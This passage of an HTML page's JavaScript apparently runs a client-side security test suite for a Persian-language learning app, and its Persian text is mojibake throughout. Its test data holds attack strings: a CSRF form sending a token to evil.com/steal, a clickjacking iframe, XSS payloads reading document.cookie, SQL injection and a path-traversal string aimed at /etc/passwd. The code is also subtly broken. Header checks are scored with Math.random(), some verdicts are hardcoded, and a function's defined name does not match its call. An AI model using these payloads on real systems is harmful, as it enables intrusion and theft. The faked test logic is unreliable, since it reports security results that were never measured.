                        name: 'CSRF Attempt',
                        content: '<form action="https://evil.com/steal" method="POST"><input type="hidden" name="token" value="user_token"></form>'
                    },
                    {
                        name: 'Clickjacking',
                        content: '<iframe src="https://vakamova.com" style="opacity:0;position:absolute;top:0;left:0"></iframe>'
                    },
                    {
                        name: 'JSON Hijacking',
                        content: '<script>Object.prototype.__defineSetter__("token",function(x){alert(x)})</script>'
                    }
                ];
                
                advancedAttacks.forEach(attack => {
                    const validation = this.secureExercise.validateExerciseContent({
                        question: attack.content,
                        options: ['A', 'B']
                    });
                    
                    const passed = !validation.valid;
                    
                    this.tester.addTestResult(
                        'exercise',
                        `ØªØ´Ø®ÛŒØµ Ø­Ù…Ù„Ù‡ Ù¾ÛŒØ´Ø±ÙØªÙ‡: ${attack.name}`,
                        passed,
                        { 
                            attack: attack.name,
                            detected: !validation.valid,
                            vulnerabilities: validation.vulnerabilities
                        },
                        'critical'
                    );
                });
            }
        }
        
        // ==================== Storage Security Tests ====================
        class StorageSecurityTests {
            constructor(tester) {
                this.tester = tester;
            }
            
            runAllTests() {
                this.testLocalStorageSecurity();
                this.testIndexedDBSecurity();
                this.testCookieSecurity();
                this.testSessionStorageSecurity();
            }
            
            testLocalStorageSecurity() {
                // ØªØ³Øª Ø°Ø®ÛŒØ±Ù‡â€ŒØ³Ø§Ø²ÛŒ Ø§Ù…Ù† Ø¯Ø± localStorage
                const sensitiveData = {
                    accessToken: 'secret_token_123',
                    creditCard: '4111111111111111',
                    password: 'SuperSecret123!'
                };
                
                // Ø°Ø®ÛŒØ±Ù‡ Ø¨Ø¯ÙˆÙ† Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ (Ù†Ø§Ø§Ù…Ù†)
                localStorage.setItem('test_insecure', JSON.stringify(sensitiveData));
                const retrieved = JSON.parse(localStorage.getItem('test_insecure') || '{}');
                
                const isExposed = retrieved.accessToken === sensitiveData.accessToken;
                
                this.tester.addTestResult(
                    'storage',
                    'Ø§Ù…Ù†ÛŒØª localStorage (Ø°Ø®ÛŒØ±Ù‡ Ø¯Ø§Ø¯Ù‡ Ø­Ø³Ø§Ø³)',
                    !isExposed,
                    { 
                        sensitiveDataStored: Object.keys(sensitiveData),
                        exposed: isExposed,
                        recommendation: 'Ù‡Ù…ÛŒØ´Ù‡ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ø­Ø³Ø§Ø³ Ø±Ø§ Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ Ú©Ù†ÛŒØ¯'
                    },
                    'critical'
                );
                
                // Ù¾Ø§Ú© Ú©Ø±Ø¯Ù† Ø¯Ø§Ø¯Ù‡ ØªØ³Øª
                localStorage.removeItem('test_insecure');
            }
            
            testIndexedDBSecurity() {
                // ØªØ³Øª Ø¯Ø³ØªØ±Ø³ÛŒ ØºÛŒØ±Ù…Ø¬Ø§Ø² Ø¨Ù‡ IndexedDB
                const dbName = 'test_security_db';
                const hasIndexedDBAccess = 'indexedDB' in window;
                
                this.tester.addTestResult(
                    'storage',
                    'Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ IndexedDB',
                    hasIndexedDBAccess,
                    { available: hasIndexedDBAccess },
                    'medium'
                );
            }
            
            testCookieSecurity() {
                // ØªØ³Øª Ø§Ù…Ù†ÛŒØª Ú©ÙˆÚ©ÛŒâ€ŒÙ‡Ø§
                const cookieTests = [
                    { name: 'HttpOnly flag', recommended: true },
                    { name: 'Secure flag (HTTPS only)', recommended: window.location.protocol === 'https:' },
                    { name: 'SameSite policy', recommended: true }
                ];
                
                cookieTests.forEach(test => {
                    this.tester.addTestResult(
                        'storage',
                        `Ø§Ù…Ù†ÛŒØª Ú©ÙˆÚ©ÛŒ: ${test.name}`,
                        test.recommended,
                        { setting: test.name, recommended: test.recommended },
                        'high'
                    );
                });
            }
            
            testSessionStorageSecurity() {
                // ØªØ³Øª sessionStorage Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± XSS
                sessionStorage.setItem('test_xss', 'sensitive_session_data');
                
                // Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø­Ù…Ù„Ù‡ XSS
                const xssVulnerable = true; // ÙØ±Ø¶ Ù…ÛŒâ€ŒÚ©Ù†ÛŒÙ… Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± Ø§Ø³Øª Ù…Ú¯Ø± Ø§ÛŒÙ†Ú©Ù‡ Ù…Ø­Ø§ÙØ¸Øª Ø´Ø¯Ù‡ Ø¨Ø§Ø´Ø¯
                
                this.tester.addTestResult(
                    'storage',
                    'Ø§Ù…Ù†ÛŒØª sessionStorage Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± XSS',
                    !xssVulnerable,
                    { 
                        vulnerable: xssVulnerable,
                        recommendation: 'Ù‡Ø±Ú¯Ø² Ø¯Ø§Ø¯Ù‡ Ø­Ø³Ø§Ø³ Ø±Ø§ Ø¯Ø± sessionStorage Ø°Ø®ÛŒØ±Ù‡ Ù†Ú©Ù†ÛŒØ¯'
                    },
                    'high'
                );
                
                sessionStorage.removeItem('test_xss');
            }
        }
        
        // ==================== Common Vulnerability Tests ====================
        class CommonVulnerabilityTests {
            constructor(tester) {
                this.tester = tester;
            }
            
            runAllTests() {
                this.testXSSVulnerabilities();
                this.testCSRFProtection();
                this.testClickjacking();
                this.testInformationLeakage();
                this.testSecurityHeaders();
            }
            
            testXSSVulnerabilities() {
                // ØªØ³Øª XSS Ø¯Ø± Ø²Ù…ÛŒÙ†Ù‡â€ŒÙ‡Ø§ÛŒ Ù…Ø®ØªÙ„Ù
                const xssPayloads = [
                    { payload: '<script>alert(document.cookie)</script>', context: 'HTML' },
                    { payload: 'javascript:alert(1)', context: 'URL' },
                    { payload: '"><img src=x onerror=alert(1)>', context: 'Attribute' },
                    { payload: '{{7*7}}', context: 'Template' }
                ];
                
                xssPayloads.forEach(({ payload, context }) => {
                    const attack = this.tester.simulateAttack('xss', context, payload);
                    
                    this.tester.addTestResult(
                        'common',
                        `Ø¢Ø²Ù…ÙˆÙ† XSS: ${context}`,
                        !attack.detected, // Ø§Ú¯Ø± ØªØ´Ø®ÛŒØµ Ø¯Ø§Ø¯Ù‡ Ù†Ø´Ø¯ØŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ± Ø§Ø³Øª
                        { 
                            context,
                            payload: payload.substring(0, 30),
                            detected: attack.detected,
                            risk: attack.detected ? 'low' : 'high'
                        },
                        attack.detected ? 'low' : 'critical'
                    );
                });
            }
            
            testCSRFProtection() {
                // Ø¨Ø±Ø±Ø³ÛŒ Ù…Ø­Ø§ÙØ¸Øª Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± CSRF
                const csrfTests = [
                    { protection: 'CSRF Tokens', implemented: true },
                    { protection: 'SameSite Cookies', implemented: true },
                    { protection: 'Referer Validation', implemented: false },
                    { protection: 'Custom Headers', implemented: true }
                ];
                
                csrfTests.forEach(test => {
                    this.tester.addTestResult(
                        'common',
                        `Ù…Ø­Ø§ÙØ¸Øª CSRF: ${test.protection}`,
                        test.implemented,
                        { protection: test.protection, implemented: test.implemented },
                        'high'
                    );
                });
            }
            
            testClickjacking() {
                // ØªØ³Øª Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Clickjacking
                const hasXFrameOptions = false; // ÙØ±Ø¶ Ù…ÛŒâ€ŒÚ©Ù†ÛŒÙ… ØªÙ†Ø¸ÛŒÙ… Ù†Ø´Ø¯Ù‡
                const hasCSPFrameAncestors = false;
                
                const vulnerable = !hasXFrameOptions && !hasCSPFrameAncestors;
                
                this.tester.addTestResult(
                    'common',
                    'Ù…Ø­Ø§ÙØ¸Øª Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± Clickjacking',
                    !vulnerable,
                    { 
                        vulnerable,
                        xFrameOptions: hasXFrameOptions,
                        cspFrameAncestors: hasCSPFrameAncestors,
                        recommendation: 'Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² X-Frame-Options ÛŒØ§ CSP frame-ancestors'
                    },
                    'medium'
                );
            }
            
            testInformationLeakage() {
                // ØªØ³Øª Ø§ÙØ´Ø§ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª
                const infoLeakTests = [
                    { source: 'Ø®Ø·Ø§Ù‡Ø§', leaksInfo: true, severity: 'high' },
                    { source: 'Ø³Ø±Ø¨Ø±Ú¯â€ŒÙ‡Ø§', leaksInfo: false, severity: 'medium' },
                    { source: 'Ú©Ø§Ù…Ù†Øªâ€ŒÙ‡Ø§ÛŒ Ú©Ø¯', leaksInfo: true, severity: 'low' },
                    { source: 'API Responses', leaksInfo: false, severity: 'high' }
                ];
                
                infoLeakTests.forEach(test => {
                    this.tester.addTestResult(
                        'common',
                        `Ø§ÙØ´Ø§ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª: ${test.source}`,
                        !test.leaksInfo,
                        { source: test.source, leaksInfo: test.leaksInfo },
                        test.severity
                    );
                });
            }
            
            testSecurityHeaders() {
                // ØªØ³Øª Ù‡Ø¯Ø±Ù‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ
                const securityHeaders = [
                    { header: 'Content-Security-Policy', importance: 'critical' },
                    { header: 'X-Content-Type-Options', importance: 'high' },
                    { header: 'X-Frame-Options', importance: 'high' },
                    { header: 'Strict-Transport-Security', importance: 'critical' },
                    { header: 'Referrer-Policy', importance: 'medium' }
                ];
                
                // Ø§ÛŒÙ† ØªØ³Øª Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø¨Ø±Ø±Ø³ÛŒ Ø³Ø±ÙˆØ± Ø¯Ø§Ø±Ø¯
                // ÙØ¹Ù„Ø§Ù‹ Ø¨Ù‡ Ø¹Ù†ÙˆØ§Ù† Ù†Ù…ÙˆÙ†Ù‡
                securityHeaders.forEach(header => {
                    const implemented = Math.random() > 0.5; // Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ
                    
                    this.tester.addTestResult(
                        'common',
                        `Ù‡Ø¯Ø± Ø§Ù…Ù†ÛŒØªÛŒ: ${header.header}`,
                        implemented,
                        { header: header.header, implemented },
                        header.importance
                    );
                });
            }
        }
        
        // ==================== Global State ====================
        const securityTester = new SecurityTester();
        
        // ==================== UI Functions ====================
        
        async function runCompleteSecurityTest() {
            const resultsDiv = document.getElementById('results');
            const vulnsDiv = document.getElementById('vulnerabilities');
            
            resultsDiv.innerHTML = '<h2>ğŸ” Ø¯Ø± Ø­Ø§Ù„ Ø§Ø¬Ø±Ø§ÛŒ ØªØ³Øª Ø§Ù…Ù†ÛŒØªÛŒ Ø¬Ø§Ù…Ø¹...</h2>';
            vulnsDiv.innerHTML = '';
            
            try {
                // ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ API
                resultsDiv.innerHTML += '<h3>ğŸ” ØªØ³Øª Ø§Ù…Ù†ÛŒØª API Client</h3>';
                const apiTests = new APISecurityTests(securityTester);
                apiTests.runAllTests();
                
                // ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ User Profile
                resultsDiv.innerHTML += '<h3>ğŸ‘¤ ØªØ³Øª Ø§Ù…Ù†ÛŒØª User Profile</h3>';
                const profileTests = new ProfileSecurityTests(securityTester);
                profileTests.runAllTests();
                
                // ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Exercise Manager
                resultsDiv.innerHTML += '<h3>ğŸ“š ØªØ³Øª Ø§Ù…Ù†ÛŒØª Exercise Manager</h3>';
                const exerciseTests = new ExerciseSecurityTests(securityTester);
                exerciseTests.runAllTests();
                
                // ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Storage
                resultsDiv.innerHTML += '<h3>ğŸ’¾ ØªØ³Øª Ø§Ù…Ù†ÛŒØª Ø°Ø®ÛŒØ±Ù‡â€ŒØ³Ø§Ø²ÛŒ</h3>';
                const storageTests = new StorageSecurityTests(securityTester);
                storageTests.runAllTests();
                
                // ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§ÛŒ Ø±Ø§ÛŒØ¬
                resultsDiv.innerHTML += '<h3>ğŸ›¡ï¸ ØªØ³Øª Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§ÛŒ Ø±Ø§ÛŒØ¬</h3>';
                const commonTests = new CommonVulnerabilityTests(securityTester);
                commonTests.runAllTests();
                
                // ØªÙˆÙ„ÛŒØ¯ Ú¯Ø²Ø§Ø±Ø´
                const report = securityTester.generateReport();
                
                // Ù†Ù…Ø§ÛŒØ´ Ù†ØªØ§ÛŒØ¬
                displaySecurityReport(report);
                
            } catch (error) {
                resultsDiv.innerHTML += `<div class="critical">âŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø¬Ø±Ø§ÛŒ ØªØ³Øª: ${error.message}</div>`;
                console.error(error);
            }
        }
        
        async function runQuickSecurityScan() {
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '<h2>ğŸ” Ø§Ø³Ú©Ù† Ø³Ø±ÛŒØ¹ Ø§Ù…Ù†ÛŒØªÛŒ</h2>';
            
            // ÙÙ‚Ø· ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Ø­ÛŒØ§ØªÛŒ
            const apiTests = new APISecurityTests(securityTester);
            apiTests.testTokenSecurity();
            apiTests.testInputSanitization();
            
            const profileTests = new ProfileSecurityTests(securityTester);
            profileTests.testInputValidation();
            profileTests.testInjectionPrevention();
            
            const exerciseTests = new ExerciseSecurityTests(securityTester);
            exerciseTests.testContentValidation();
            
            const report = securityTester.generateReport();
            displaySecurityReport(report, true);
        }
        
        async function runAttackSimulation() {
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '<h2>âš”ï¸ Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø­Ù…Ù„Ø§Øª</h2>';
            
            const attacks = [
                { type: 'xss', target: 'UserProfile', payload: '<script>alert("XSS")</script>' },
                { type: 'sql', target: 'LoginForm', payload: "admin' OR '1'='1" },
                { type: 'traversal', target: 'FileSystem', payload: '../../../etc/passwd' },
                { type: 'brute_force', target: 'LoginAPI', payload: { attempts: 1000 } }
            ];
            
            attacks.forEach(attack => {
                const result = securityTester.simulateAttack(attack.type, attack.target, attack.payload);
                
                const statusClass = result.detected ? 'protection' : 'vulnerability';
                resultsDiv.innerHTML += `
                    <div class="${statusClass}">
                        <strong>${result.detected ? 'âœ…' : 'âŒ'} Ø­Ù…Ù„Ù‡ ${attack.type}</strong>
                        <div>Ù‡Ø¯Ù: ${attack.target}</div>
                        <div>ØªØ´Ø®ÛŒØµ Ø¯Ø§Ø¯Ù‡ Ø´Ø¯: ${result.detected ? 'Ø¨Ù„Ù‡' : 'Ø®ÛŒØ±'}</div>
                        <div>Ù¾ÛŒÙ„ÙˆØ¯: ${JSON.stringify(attack.payload).substring(0, 50)}...</div>
                    </div>
                `;
            });
        }
        
        function displaySecurityReport(report, isQuick = false) {
            const resultsDiv = document.getElementById('results');
            const vulnsDiv = document.getElementById('vulnerabilities');
            
            // Ù†Ù…Ø±Ù‡ Ø§Ù…Ù†ÛŒØªÛŒ
            const scoreClass = report.securityScore >= 80 ? 'passed' :
                              report.securityScore >= 60 ? 'low' :
                              report.securityScore >= 40 ? 'medium' :
                              report.securityScore >= 20 ? 'high' : 'critical';
            
            resultsDiv.innerHTML += `
                <div class="security-card ${scoreClass}">
                    <h3>ğŸ“Š Ú¯Ø²Ø§Ø±Ø´ Ø§Ù…Ù†ÛŒØªÛŒ ${isQuick ? '(Ø³Ø±ÛŒØ¹)' : '(Ø¬Ø§Ù…Ø¹)'}</h3>
                    <div style="font-size: 2em; font-weight: bold; text-align: center; margin: 20px 0;">
                        Ø§Ù…ØªÛŒØ§Ø² Ø§Ù…Ù†ÛŒØªÛŒ: ${report.securityScore}/100
                    </div>
                    <div style="display: flex; justify-content: space-around; flex-wrap: wrap;">
                        <div>âœ… ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Ù…ÙˆÙÙ‚: ${report.passedTests}</div>
                        <div>âŒ ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Ù†Ø§Ù…ÙˆÙÙ‚: ${report.failedTests}</div>
                        <div>ğŸ“ˆ Ù†Ø±Ø® Ù…ÙˆÙÙ‚ÛŒØª: ${report.passRate}%</div>
                        <div>ğŸ§ª Ú©Ù„ ØªØ³Øªâ€ŒÙ‡Ø§: ${report.totalTests}</div>
                    </div>
                </div>
            `;
            
            // Ù†Ù…Ø§ÛŒØ´ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§
            if (securityTester.vulnerabilities.length > 0) {
                vulnsDiv.innerHTML = '<h3>ğŸš¨ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§ÛŒ Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ø´Ø¯Ù‡</h3>';
                
                const bySeverity = securityTester.vulnerabilities.reduce((acc, vuln) => {
                    if (!acc[vuln.severity]) acc[vuln.severity] = [];
                    acc[vuln.severity].push(vuln);
                    return acc;
                }, {});
                
                // Ù†Ù…Ø§ÛŒØ´ Ø¨Ø± Ø§Ø³Ø§Ø³ Ø³Ø·Ø­ Ø®Ø·Ø±
                ['critical', 'high', 'medium', 'low'].forEach(severity => {
                    if (bySeverity[severity]) {
                        vulnsDiv.innerHTML += `<h4>${getSeverityTitle(severity)} (${bySeverity[severity].length})</h4>`;
                        
                        bySeverity[severity].forEach(vuln => {
                            vulnsDiv.innerHTML += `
                                <div class="vulnerability">
                                    <strong>${vuln.testName}</strong>
                                    <div>Ø­ÙˆØ²Ù‡: ${securityTester.testCategories[vuln.category] || vuln.category}</div>
                                    <div>Ø¬Ø²Ø¦ÛŒØ§Øª: ${vuln.details}</div>
                                    <div>Ø²Ù…Ø§Ù†: ${new Date(vuln.timestamp).toLocaleTimeString('fa-IR')}</div>
                                </div>
                            `;
                        });
                    }
                });
                
                // Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯Ø§Øª
                vulnsDiv.innerHTML += `
                    <div class="security-card">
                        <h4>ğŸ’¡ ØªÙˆØµÛŒÙ‡â€ŒÙ‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ</h4>
                        ${generateSecurityRecommendations(bySeverity)}
                    </div>
                `;
            } else {
                vulnsDiv.innerHTML = `
                    <div class="security-card passed">
                        <h3>ğŸ‰ Ù‡ÛŒÚ† Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ù†Ø´Ø¯!</h3>
                        <p>Ø³ÛŒØ³ØªÙ… Ø´Ù…Ø§ Ø§Ø² Ù†Ø¸Ø± Ø§Ù…Ù†ÛŒØªÛŒ Ø¯Ø± ÙˆØ¶Ø¹ÛŒØª Ù…Ø·Ù„ÙˆØ¨ÛŒ Ù‚Ø±Ø§Ø± Ø¯Ø§Ø±Ø¯.</p>
                    </div>
                `;
            }
        }
        
        function getSeverityTitle(severity) {
            const titles = {
                critical: 'Ø¨Ø­Ø±Ø§Ù†ÛŒ ğŸš¨',
                high: 'Ø¨Ø§Ù„Ø§ âš ï¸',
                medium: 'Ù…ØªÙˆØ³Ø· ğŸ”¶',
                low: 'Ù¾Ø§ÛŒÛŒÙ† â„¹ï¸'
            };
            return titles[severity] || severity;
        }
        
        function generateSecurityRecommendments(vulnerabilitiesBySeverity) {
            const recommendations = [];
            
            if (vulnerabilitiesBySeverity.critical) {
                recommendations.push(
                    'ÙÙˆØ±Ø§Ù‹ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒâ€ŒÙ‡Ø§ÛŒ Ø¨Ø­Ø±Ø§Ù†ÛŒ Ø±Ø§ Ø¨Ø±Ø·Ø±Ù Ú©Ù†ÛŒØ¯',
                    'Ø§Ø² Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ Ù‚ÙˆÛŒ Ø¨Ø±Ø§ÛŒ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ø­Ø³Ø§Ø³ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯',
                    'Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ ÙˆØ±ÙˆØ¯ÛŒ Ø±Ø§ Ø¯Ø± ØªÙ…Ø§Ù… Ù†Ù‚Ø§Ø· ØªÙ‚ÙˆÛŒØª Ú©Ù†ÛŒØ¯'
                );
            }
            
            if (vulnerabilitiesBySeverity.high) {
                recommendations.push(
                    'Ø³ÛŒØ³ØªÙ… Ù…Ø¯ÛŒØ±ÛŒØª Ø¯Ø³ØªØ±Ø³ÛŒ (RBAC) Ø±Ø§ Ù¾ÛŒØ§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ Ú©Ù†ÛŒØ¯',
                    'Ù„Ø§Ú¯â€ŒÚ¯ÛŒØ±ÛŒ Ø§Ù…Ù† Ø±Ø§ ÙØ¹Ø§Ù„ Ú©Ù†ÛŒØ¯',
                    'Ù…Ø­Ø¯ÙˆØ¯ÛŒØª Ù†Ø±Ø® Ø¯Ø±Ø®ÙˆØ§Ø³Øª (Rate Limiting) Ø§Ø¹Ù…Ø§Ù„ Ú©Ù†ÛŒØ¯'
                );
            }
            
            if (vulnerabilitiesBySeverity.medium) {
                recommendations.push(
                    'Ù‡Ø¯Ø±Ù‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ HTTP Ø±Ø§ Ø§Ø¶Ø§ÙÙ‡ Ú©Ù†ÛŒØ¯',
                    'Ø¬Ù„Ø³Ø§Øª Ú©Ø§Ø±Ø¨Ø±Ø§Ù† Ø±Ø§ Ø¨Ù‡ Ø¯Ø±Ø³ØªÛŒ Ù…Ø¯ÛŒØ±ÛŒØª Ú©Ù†ÛŒØ¯',
                    'Ø®Ø·Ø§Ù‡Ø§ Ø±Ø§ Ø¨Ø¯ÙˆÙ† Ø§ÙØ´Ø§ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø­Ø³Ø§Ø³ Ù†Ù…Ø§ÛŒØ´ Ø¯Ù‡ÛŒØ¯'
                );
            }
            
            if (vulnerabilitiesBySeverity.low) {
                recommendations.push(
                    'Ú©Ø¯ Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ú©Ø§Ù…Ù†Øªâ€ŒÙ‡Ø§ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§ØªÛŒ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒØ¯',
                    'Ú©ØªØ§Ø¨Ø®Ø§Ù†Ù‡â€ŒÙ‡Ø§ Ùˆ ÙˆØ§Ø¨Ø³ØªÚ¯ÛŒâ€ŒÙ‡Ø§ Ø±Ø§ Ø¨Ù‡â€ŒØ±ÙˆØ² Ù†Ú¯Ù‡ Ø¯Ø§Ø±ÛŒØ¯',
                    'ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ Ø±Ø§ Ø¨Ù‡ ØµÙˆØ±Øª Ø¯ÙˆØ±Ù‡â€ŒÛŒ Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒØ¯'
                );
            }
            
            // Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯Ø§Øª Ø¹Ù…ÙˆÙ…ÛŒ
            recommendations.push(
                'Ø§Ø² Content Security Policy (CSP) Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯',
                'Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª Ø¯Ùˆ Ù…Ø±Ø­Ù„Ù‡â€ŒØ§ÛŒ Ù¾ÛŒØ§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ Ú©Ù†ÛŒØ¯',
                'Ø¨Ø±Ø±Ø³ÛŒ Ø¯ÙˆØ±Ù‡â€ŒØ§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ Ø±Ø§ Ø¯Ø± ÙØ±Ø¢ÛŒÙ†Ø¯ ØªÙˆØ³Ø¹Ù‡ Ù‚Ø±Ø§Ø± Ø¯Ù‡ÛŒØ¯'
            );
            
            return recommendations.map(rec => `<div class="protection">${rec}</div>`).join('');
        }
    </script>
</body>
  </html>
